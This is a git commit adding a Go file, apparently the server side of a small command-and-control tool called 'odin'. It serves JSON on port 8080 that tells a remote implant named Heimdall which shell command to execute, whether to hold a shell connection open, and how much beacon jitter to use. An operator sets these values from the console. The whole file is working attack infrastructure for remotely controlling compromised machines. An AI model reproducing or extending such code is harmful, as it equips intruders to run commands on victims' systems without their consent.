fea4919c5a878de5dd2d2f628632ce556f0ce560
Patryk Zajko <patryk.zajko@medidesk.com>
2025-05-02 22:53:35 +0200

    odin server

---
+++ main.go
@@ -0,0 +1,59 @@
+package main
+
+import (
+	"bufio"
+	"github.com/fatih/color"
+	"github.com/gin-gonic/gin"
+	"net/http"
+	"os"
+	"strconv"
+	"strings"
+)
+
+type Heimdall struct {
+	KeepShellConnection bool
+	ExecuteCommand      string
+	Jitter              int64
+}
+
+var heimdall = Heimdall{false, "", 0}
+
+func main() {
+	go processOdinCommands()
+
+	g := gin.Default()
+	g.GET("/", respondHeimdall)
+	err := g.Run(":8080")
+	if err != nil {
+		panic(err)
+	}
+}
+
+func respondHeimdall(context *gin.Context) {
+	context.JSON(http.StatusOK, heimdall)
+}
+
+func processOdinCommands() {
+	color.Red("Provide commands to Heimdall:")
+	color.Red("1. k=true|false - Open/Close shell connection")
+	color.Red("2. e=ls -al - Set command to execute")
+	color.Red("3. j=10 - Set jitter in seconds")
+
+	scanner := bufio.NewScanner(os.Stdin)
+	for scanner.Scan() {
+		input := scanner.Text()
+		if strings.Contains(input, "k=") {
+			heimdall.KeepShellConnection, _ = strconv.ParseBool(strings.Replace(input, "k=", "", 1))
+			color.Green("KeepShellConnection set to %t", heimdall.KeepShellConnection)
+		} else if strings.Contains(input, "e=") {
+			cmd := strings.ReplaceAll(strings.Replace(strings.Replace(input, "e=", "", 1), " ", "||", 1), " ", ";")
+			heimdall.ExecuteCommand = cmd
+			color.Green("Command set to %s", cmd)
+		} else if strings.Contains(input, "j=") {
+			heimdall.Jitter, _ = strconv.ParseInt(strings.Split(input, "j=")[1], 10, 64)
+			color.Green("Jitter set to %d", heimdall.Jitter)
+		} else {
+			color.Red("Invalid command. Use k=, e=, or j=")
+		}
+	}
+}
